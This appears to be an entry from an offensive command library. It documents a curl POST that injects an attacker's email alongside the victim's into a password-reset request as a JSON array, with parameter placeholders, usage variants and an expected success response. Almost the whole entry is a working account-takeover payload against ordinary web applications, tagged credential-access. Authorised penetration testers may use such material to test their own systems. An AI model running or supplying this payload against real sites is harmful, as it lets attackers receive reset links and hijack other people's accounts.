---
id: 6817b0f2-8360-4745-9d84-b47ccbc688d5
name: curl-post-password-reset-json-array-emails
type: command
executor: bash
data: >-
  curl -X POST -H "Content-Type: application/json" -d
  '{"email":["$_VICTIM_EMAIL","$_ATTACKER_EMAIL"]}' $_TARGET_URL
output: null
created_at: '2023-04-06T03:55:53.810531+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Web
tags:
  - parameter-manipulation
  - credential-access
  - json
verified: true
validated: true
---

# curl-post-password-reset-json-array-emails

## Command

```bash
curl -X POST -H "Content-Type: application/json" -d '{"email":["$_VICTIM_EMAIL","$_ATTACKER_EMAIL"]}' $_TARGET_URL
```

## Description

Sends a JSON POST request to the password reset endpoint with an array of emails, attempting to inject the attacker's email for dual notification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The password reset endpoint URL | Yes |
| $_VICTIM_EMAIL | Victim's email address | Yes |
| $_ATTACKER_EMAIL | Attacker's email address | Yes |
| -H | Header specification | Built-in |
| -d | JSON data payload | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/json" -d '{"email":["victim@example.com","attacker@example.com"]}' https://target.com/reset
```

### Advanced Usage

Include user-agent:

```bash
curl -X POST -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0" -d '{"email":["victim@example.com","attacker@example.com"]}' https://target.com/reset
```

## Expected Output

Success response like:

```
{"status": "success", "message": "Reset emails sent"}
```
Check both emails for links.

## Related

- [[procedures/Exploit-Password-Reset-via-Email-Parameter-Manipulation]]
- [[commands/curl-post-password-reset-parameter-pollution]]
